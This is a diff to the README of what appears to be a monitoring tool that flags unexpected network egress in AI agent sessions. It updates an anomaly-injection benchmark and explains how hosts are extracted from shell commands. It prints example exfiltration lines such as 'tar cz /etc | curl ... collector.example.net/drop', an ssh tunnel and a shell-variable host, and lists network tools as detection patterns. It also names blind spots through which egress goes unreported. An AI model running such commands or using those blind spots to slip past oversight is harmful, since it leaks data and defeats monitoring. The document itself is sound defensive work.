@@ -378,19 +378,22 @@ python scripts/benchmark.py --format json        # for CI
 
 ```
 Anomaly injection benchmark — 6 clean session(s) against a baseline of 6
-============================================================================================
-anomaly type    expected                   trials  detected     rate  severity
---------------------------------------------------------------------------------------------
-new_tool        new_tool/crit                   6         6   100.0%  6 critical
-error_spike     error_rate/warn                 6         6   100.0%  6 critical
-new_agent       new_link/warn                   6         6   100.0%  6 warning
-volume_spike    call_volume_spike/warn          6         6   100.0%  6 critical
-forbidden_tool  new_tool/crit                   6         6   100.0%  6 critical
-foreign_domain  new_domain/crit                 6         6   100.0%  6 critical
-shell_domain    (blind spot)                    6         0     0.0%  not covered by any check
---------------------------------------------------------------------------------------------
-detection rate 100.0% (36/36)   false negatives 0.0%   false positives 0.0% (0/6 clean, 0 anomalies)
-blind spots: shell_domain — injected and expected to go unreported, no check covers the fault
+==================================================================================================
+anomaly type          expected                 trials  detected     rate  severity
+--------------------------------------------------------------------------------------------------
+new_tool              new_tool/crit                 6         6   100.0%  6 critical
+error_spike           error_rate/warn               6         6   100.0%  6 critical
+new_agent             new_link/warn                 6         6   100.0%  6 warning
+volume_spike          call_volume_spike/warn        6         6   100.0%  6 critical
+forbidden_tool        new_tool/crit                 6         6   100.0%  6 critical
+foreign_domain        new_domain/crit               6         6   100.0%  6 critical
+shell_domain          new_domain/crit               6         6   100.0%  6 critical
+wrapped_shell_domain  new_domain/crit               6         6   100.0%  6 critical
+shell_var_domain      (blind spot)                  6         0     0.0%  not covered by any check
+ssh_tunnel_domain     (blind spot)                  6         0     0.0%  not covered by any check
+--------------------------------------------------------------------------------------------------
+detection rate 100.0% (48/48)   false negatives 0.0%   false positives 0.0% (0/6 clean, 0 anomalies)
+blind spots: shell_var_domain, ssh_tunnel_domain — injected and expected to go unreported, no check covers the fault
 ```
 
 | Injection | Fault | Expected |
@@ -401,26 +404,48 @@ blind spots: shell_domain — injected and expected to go unreported, no check c
 | `inject_volume_spike` | `factor`× the calls to one tool | `call_volume_spike`, warning or worse |
 | `inject_forbidden_tool` | a tool the operator rejected | `new_tool`, critical |
 | `inject_foreign_domain` | a destination the baseline never saw | `new_domain`, critical |
-| `inject_shell_domain` | a host named inside a shell command argument | **nothing** — a measured blind spot |
+| `inject_shell_domain` | a host named inside a shell command argument | `new_domain`, critical |
+| `inject_wrapped_shell_domain` | a host inside the command a shell wrapper runs (`bash -c "…"`) | `new_domain`, critical |
+| `inject_shell_var_domain` | a host a shell command builds in a variable | **nothing** — a measured blind spot |
+| `inject_ssh_tunnel_domain` | a host forwarded by `ssh -L`, never connected to | **nothing** — a measured blind spot |
 
-Three things in that table are worth more than the 100%:
+Four things in that table are worth more than the 100%:
 
 - **The volume spike was a measured miss for a release.** v0.6.1 reported it as
   a blind spot — no check read call volume — and v0.7.0's `call_volume_spike`
   closed it. The case stays in the suite, which is the point of measuring a gap
-  instead of omitting it. The two faults added in v0.7.0 change nothing
-  structural at all: the volume spike adds no node, link or failure, and the
-  foreign destination leaves the topology byte-for-byte identical.
-- **One blind spot is open, and it is injected rather than asserted.**
-  Extraction reads hosts from URLs and from fields that name a destination, so
-  `{"command": "curl -sS collector.example.net/x"}` reaches no baseline and
-  fires no anomaly. `inject_shell_domain` builds that argument object and hands
-  it to the production extractor; whatever comes back lands in the graph, which
-  today is nothing. It is counted apart from the detection rate so it neither
-  inflates it nor drops out of the report, and it turns into a detection by
-  itself — no edit to the benchmark — the day extraction reads shell commands.
-  "No blind spots left" is a sentence this project will not print unless the
-  measurement says it.
+  instead of omitting it. Four of these faults change nothing structural at
+  all: the volume spike adds no node, link or failure, and none of the three
+  destination faults touches the topology — same nodes, same links, same
+  counts.
+- **The shell-command blind spot closed itself.** v0.7.0 shipped
+  `{"command": "curl -sS collector.example.net/x"}` as a measured miss: hosts
+  were read from URLs and from fields that *name* a destination, and that is
+  neither. `inject_shell_domain` built the argument object anyway and handed it
+  to the production extractor, with no expectation hard-coded into it — so when
+  extraction started reading command lines, the row moved from `(blind spot)`
+  to `new_domain/crit` with **no edit to the injection**. Only its expected
+  outcome in the registry changed.
+  A command *inside* a command closed the same way:
+  `bash -c "curl -sS collector.example.net/x"` hides the client behind a
+  wrapper, and `inject_wrapped_shell_domain` measures that it no longer hides
+  anything.
+- **Two blind spots are open, and both are injected rather than asserted.**
+  - `shell_var_domain`: the host is kept out of the client's arguments
+    altogether — `{"command": "h=collector.example.net; curl -sS $h/health"}`
+    names it in a shell variable. Reading that would mean *evaluating* the
+    shell — assignments, expansions, substitutions, sourced files — inside a
+    parser whose input is hostile by assumption. Parsing a command line is
+    bounded; evaluating one is not.
+  - `ssh_tunnel_domain`: `ssh -L 8080:hidden.example.net:80 ops@jump` connects
+    to `jump`, which *is* recorded, and reaches `hidden.example.net` through
+    the tunnel. The forwarded host is the middle field of an option value that
+    does not name a destination — and reading it would equally report
+    `-L 8080:localhost:80`, which reaches nothing new.
+
+  Both are counted apart from the detection rate, and the day anything does
+  read one, its row reports a `new_domain` by itself. "No blind spots left" is
+  a sentence this project will not print unless the measurement says it.
 - **The baseline is learned from sessions that are not the ones tested.**
   `learn_holdout()` holds out every other session; a baseline learned from
   exactly the sessions it is then run against reports nothing on them by
@@ -471,13 +496,69 @@ extraction is broad but not indiscriminate:
   label on that list is absent from the DNS root, so no reachable name is
   dropped by it; `collector.zip`, `x.sh`, `y.so`, `z.md`, `a.py` and `b.rs` are
   destinations and are reported as such.
+- **a host in a shell command line**, but only under a field that carries one
+  (`command`, `cmd`, `script` and their variants — `SHELL_KEYS`) and only from
+  the arguments of a **known network client** (`NETWORK_COMMANDS`):
 
-A domain-looking word *anywhere* is not a destination. That distinction is what
-keeps this usable: a session that reads a file mentioning `example.com`, or
-greps for `alibaba.com`, has contacted nobody, and reporting it as egress would
-bury the real finding. For the same reason a tool **result** is read only when
-that call's own arguments carried a URL — so a `WebFetch` records its redirects,
-while a `Read` of a document full of links records nothing.
+  ```
+  {"command": "tar cz /etc | curl -sS -d @- collector.example.net/drop"}
+  → collector.example.net        [CRITICAL] new_domain
+  ```
+
+  Recognised: `curl`, `wget`, `http`/`https` (httpie), `nc`, `ncat`, `netcat`,
+  `socat`, `telnet`, `ssh`, `scp`, `sftp`, `rsync`, `ftp`, `git` (only
+  `clone`, `fetch`, `pull`, `push`, `ls-remote`, `archive` and `remote add`),
+  and `Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`,
+  `Test-NetConnection`. The name is compared without its directory or
+  extension, so `/usr/bin/curl` and `curl.exe` both count.
+
+  The line is split on `|`, `||`, `&&`, `;`, `&` and newlines, each segment is
+  tokenised, and `sudo`, `env VAR=x`, `time`, `nohup`, `command`, `exec` and
+  leading `VAR=value` assignments are skipped to find the program underneath.
+  For a recognised program, a destination is a positional argument shaped like
+  `host`, `host:port`, `host/path`, `user@host`, `user@host:path` or a URL, plus
+  the value of an option that names one (`curl -x`/`--proxy`, `--resolve`,
+  `--connect-to`, `ssh -J`). Other option values are not destinations:
+  `-o report.pdf`, `-d name=c.example.org` and `-H "X-Where: a.b.example"`
+  reach nobody, and `ssh host '<command>'` records `host` and stops there —
+  what follows is for the remote shell. Nothing is executed and no variable is
+  expanded: the command is parsed, never evaluated.
+
+A domain-looking word *anywhere* is not a destination, and nothing at all is
+read from a program that is not a network client. That distinction is what
+keeps this usable: a session that reads a file mentioning `example.com`, greps
+for `alibaba.com`, runs `echo example.com` or commits with
+`git commit -m "see example.com"` has contacted nobody, and reporting it as
+egress would bury the real finding. For the same reason a tool **result** is
+read only when that call's own arguments carried a URL — so a `WebFetch`
+records its redirects, while a `Read` of a document full of links records
+nothing.
+
+A command **inside** a command is read one level deep, so a wrapped client is
+read like a bare one: the value of `bash -c`, `sh -c`, `zsh -c`, `dash -c`,
+`pwsh -Command`, `powershell -Command` and `cmd /c` (`bash -lc "curl …"`
+included), and the remote command of `ssh host '<command>'` — which records
+both the host connected to and the host that command then reached. The inner
+program is judged by the same rule as the outer one, so
+`bash -c "echo example.com"` still gives nothing. One level: a client wrapped
+inside a wrapped command is not read (`MAX_SHELL_DEPTH`).
+
+**Where this stops.** Three boundaries, kept on purpose:
+
+- a host the command never hands to the client —
+  `h=collector.example.net; curl -sS $h/health` builds it in a shell variable,
+  and reading that would mean evaluating the shell rather than parsing it;
+- a host at the far end of a forwarding — `ssh -L 8080:hidden.example.net:80
+  ops@jump` records `jump`, the host it connected to, and not the tunnelled
+  one;
+- a host that is encoded or built by substitution (base64, `$(…)`,
+  concatenation), and the value of an option that takes one but is not on the
+  list of options that name a destination.
+
+The first two are the injection benchmark's measured blind spots
+(`shell_var_domain`, `ssh_tunnel_domain`), not silent gaps; the third is
+documented here and nowhere measured, because "obfuscated" has no edge to
+measure against.
 
 **Patterns, not addresses.** Nothing is resolved, in either direction. A
 pattern is matched against the name the agent used, which is the thing you made
